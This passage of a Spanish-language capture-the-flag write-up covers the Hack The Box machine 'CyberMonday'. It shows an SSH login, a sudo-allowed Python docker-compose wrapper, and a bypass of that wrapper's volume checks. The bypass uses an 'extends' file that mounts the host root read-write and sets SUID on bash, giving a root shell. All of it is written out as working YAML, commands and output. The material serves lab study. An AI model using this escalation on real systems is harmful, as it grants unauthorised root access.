drwxr-xr-x 5 1000 1000 4096 Aug  3 09:51 ..
-rw-r--r-- 1 root root  742 Jun 30 15:50 authorized_keys
www-data@070370e2cdc4:/mnt/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday
```

Intentado utilizar este nombre de usuario con la contraseña ganaremos acceso al sistema como `john` y podremos tomar la primera flag:

```bash
❯ /usr/bin/ssh john@cybermonday.htb
The authenticity of host 'cybermonday.htb (10.129.100.146)' can't be established.
ED25519 key fingerprint is SHA256:KN9ev9G8u8Q4yY10fnm1hyEg8EbMvMRHxvDvCxRf6do.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cybermonday.htb' (ED25519) to the list of known hosts.
john@cybermonday.htb's password: 
Linux cybermonday 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
john@cybermonday:~$ export TERM=xterm-256color
john@cybermonday:~$ bash
john@cybermonday:~$ ls
changelog.txt  logs  user.txt
john@cybermonday:~$ cat user.txt
e892561e4d89a4bd9bc6e44251******
```

## Escalada de privilegios

Tenemos un privilegio de sudo para ejecutar un script de python como root

```bash
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
```

El script contiene lo siguiente:

```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```
{: file="/opt/secure_compose.py"}

Parece un frontend seguro para `docker-compose`, sin embargo limitar solamente esas instrucciones pinta mal de a primeras, ya que dicho programa contiene opciones como:

![compose](/assets/writeups/cybermonday/6.png)

Podemos simplemente crearnos dos estructuras como estas:

```yml
version: '2'

services:
  uwu:
    image: cybermonday_api
    command: chmod u+s /mnt/bin/bash
    extends:
      file: /tmp/common.yml
      service: uhno
```
{: file="docker-compose.yml"}

```yml
version: '2'

services:
  uhno:
    volumes:
    - '/:/mnt:rw'
```
{: file="common.yml"}

y con componerlas, nos dejaría una bash SUID

```bash
john@cybermonday:/tmp$ sudo -u root /opt/secure_compose.py docker-compose.yml
Starting services...
Finishing services
john@cybermonday:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Ahora ya podemos tomar la última flag

```bash
john@cybermonday:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
cybermonday  root.txt
bash-5.1# cat root.txt
45930c3192602083bbd0e9dbc4******
bash-5.1# chmod u-s /bin/bash
```

## Extra

Mi forma de escalar privilegios era una no intencionada al parecer, por que otras personas simplemente crearon un contenedor con capabilidades demás y se aprovechaban de eso. De lo que he visto creo que soy el único que lo hizo así.

También cabe agregar algo de los dockers; sus direcciones pueden cambiar.